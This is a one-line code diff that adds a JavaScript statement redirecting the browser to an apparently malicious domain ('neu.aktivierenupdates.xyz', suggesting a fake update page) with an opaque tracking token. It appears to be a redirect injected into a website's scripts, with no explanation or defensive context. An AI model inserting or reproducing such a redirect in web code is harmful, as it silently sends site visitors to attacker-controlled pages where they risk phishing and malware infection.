@@ -1,0 +1,1 @@
+window.location.replace("https://neu.aktivierenupdates.xyz/gATsAVpyuHuwi70YMz87gtO2nZlopwJwnEvB4pCEeXYEPa1VcuJb5hI/");
